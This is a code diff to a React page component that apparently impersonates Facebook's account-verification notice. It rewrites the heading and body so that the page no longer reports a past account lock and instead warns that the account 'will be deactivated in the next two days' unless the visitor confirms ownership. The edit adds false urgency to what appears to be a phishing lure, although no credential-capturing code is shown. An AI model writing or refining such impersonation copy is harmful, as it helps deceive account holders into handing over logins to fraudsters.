@@ -46,7 +46,7 @@ const Home = () => {
             textAlign: "center",
           }}
         >
-          We need to confirm this account belongs to you
+          Hi, we need to confirm this account belongs to you
         </h1>
 
         <h4
@@ -58,9 +58,8 @@ const Home = () => {
             marginTop: "1rem",
           }}
         >
-          We saw unusual activity and locked your account on August 5, 2023. No
-          one will be able to see this Facebook profile or use the account until
-          you’ve confirmed it’s yours.
+          Your account will be deactivated in the next two days. No one can see
+          this Facebook profile or use the account until you confirm it's yours.
         </h4>
 
         <div
